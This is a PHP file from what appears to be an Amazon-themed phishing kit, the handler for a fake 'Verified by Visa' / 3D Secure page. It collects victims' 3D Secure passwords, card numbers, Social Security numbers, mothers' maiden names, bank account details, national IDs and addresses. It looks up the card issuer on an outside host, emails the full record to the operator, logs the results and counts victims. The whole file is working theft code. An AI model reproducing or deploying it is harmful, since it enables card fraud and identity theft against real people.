<?php
session_start();
$user_agent = $_SERVER['HTTP_USER_AGENT'];
require "../functions/Mfunctions.php";
require "../functions/get_ip.php"; 
require "../../../config.php";
$_SESSION['_password_vbv_'] = $_POST['password_vbv'];
$_SESSION['_dob_'] = $_POST['day']."/".$_POST['month']."/".$_POST['year'];
$_SESSION['_sortnum_'] = $_POST['sortnum1']."-".$_POST['sortnum2']."-".$_POST['sortnum3'];
$_SESSION['_accnumber_'] = $_POST['accnumber'];
$_SESSION['_ssnnum_'] = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
$_SESSION['_mmname_'] = $_POST['mmname'];
$_SESSION['_creditlimit_'] = $_POST['creditlimit'];
$_SESSION['_osid_'] = $_POST['osid'];	
$_SESSION['_codicefiscale_'] = $_POST['codicefiscale'];
$_SESSION['_kontonummer_'] = $_POST['kontonummer'];
$_SESSION['_offid_'] = $_POST['offid'];
$_SESSION['_cc_holder_'] = strtoupper($_SESSION['_cc_holder_']);
$_SESSION['_cc_number_'] = preg_replace('/\s+/', '', $_SESSION['_cc_number_']);
$BIN_LOOKUP = substr($_SESSION['_cc_number_'], 0, 6);
$SOME_BIN    = @json_decode(file_get_contents("https://bincodes.ga/GET_BIN.php?cc=$BIN_LOOKUP"));
$BIN_SCHEME    = $SOME_BIN->SCHEME;
$BIN_TYPE      = $SOME_BIN->TYPE;
$BIN_BRAND     = $SOME_BIN->BRAND;
$BIN_CNAME     = $SOME_BIN->COUNTRY;
$BIN_CCODE     = $SOME_BIN->ALPHA;
$BIN_BNAME     = $SOME_BIN->BANK;
$BIN_BURL      = $SOME_BIN->URL;
$BIN_BPHONE    = $SOME_BIN->PHONE;
$_SESSION['_country_']  = $BIN_CNAME;
$_SESSION['_cc_brand_'] = $BIN_SCHEME;
$_SESSION['_cc_bank_']  = $BIN_BNAME;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_BRAND;
$_SESSION['_cc_site_']  = $BIN_BURL;
$_SESSION['_cc_phone_'] = $BIN_BPHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." - ".$_SESSION['_cc_bank_']." - ".$_SESSION['_cc_type_']." - ".$_SESSION['_cc_class_'];
$VISACARD   = $_SESSION['_cc_brand_'] == "VISA" || $_SESSION['_cc_brand_'] == "VISA ELECTRON";
$MASTERCARD = $_SESSION['_cc_brand_'] == "MASTERCARD" || $_SESSION['_cc_brand_'] ==  "MAESTRO";
if($MASTERCARD) {
$Type_XXX = "MasterCard SecureCode";
}elseif($VISACARD) {
$Type_XXX = "Verified by Visa";}
$from = $senderemail;
$headers = "From: ".$_SESSION['_cc_holder_']." <$from>";
$subj = "VBV ".$BIN_LOOKUP." - ".$_SESSION['_ccglobal_']." - [ ".$_SESSION['_LOOKUP_COUNTRY_']." - $ip ]";
$to = $Your_Email;
$data = "
.++======[ Amazon VBV Credit Card  - Powered By SOMETHING ]======++.

    .++=====[ VBV Credit Card ]=====++.
3D Secure   :   ".$_SESSION['_password_vbv_']."
Social Security Number   (US)    :   ".$_SESSION['_ssnnum_']."
Social Security Number   (CA)    :   ".$_SESSION['_ssnnum_']."
Mother's Maiden Name :   ".$_SESSION['_mmname_']."
Sortcode (UK/IE) :   ".$_SESSION['_sortnum_']."
Account Number (UK/IE) :   ".$_SESSION['_accnumber_']."
Credit Limits (AU) :   ".$_SESSION['_creditlimit_']."
OSID (AU) :   ".$_SESSION['_osid_']."
Codice Fiscale (IT) :   ".$_SESSION['_codicefiscale_']."
Kontonummer (CH/DE) :   ".$_SESSION['_kontonummer_']."
Officiel ID (GR) :   ".$_SESSION['_offid_']."
            .++===[ End ]===++.

.++=====[ Address & Info ]=====++.
Full Name       :   ".$_SESSION['_fullname_']."
Address         :   ".$_SESSION['_address1_']." | ".$_SESSION['_address2_']."
City/Town       :   ".$_SESSION['_city_']."
State           :   ".$_SESSION['_state_']."
Zip/PostalCode  :   ".$_SESSION['_zipCode_']."
Country         :   ".$_SESSION['_LOOKUP_COUNTRY_']." - ".$_SESSION['_country_']."
Phone Number    :   ".$_SESSION['_phone_']."
DOB             :   ".$_SESSION['_dob_']." (DD/MM/YYYY)
            .++===[ End ]===++.

    .++=====[ PC Info ]=====++.
IP Address  :   ".$_SESSION['_LOOKUP_COUNTRY_']." - ".$_SESSION['_LOOKUP_REGIONS_']." ".$_SESSION['_LOOKUP_CITY_']." - ".$_SESSION['_ip_']."
Browser     :   ".$user_agent."
        .++===[ End ]===++.

.++======[ Powered By SOMETHING - Amazon Credit Card ]======++.
";
mail($to,$subj,$data,$headers);
  $bin   = $BIN_LOOKUP." - ".$_SESSION['_ccglobal_']." [ ".$_SESSION['_LOOKUP_COUNTRY_']." ]\n";
    $file = fopen("../../../logs/some-vbv-cc.log", "a");
    fwrite($file, $bin);
    fclose($file);
    
    $file2 = "../../../logs/some-vbv.txt";
    $isi  = file_get_contents($file2);
    $buka = fopen($file2,"w"); 
       
    fwrite($buka, $isi+1);
    fclose($buka);
        header("Location: ../404.php?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
        header("Location: ./success.php?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?> 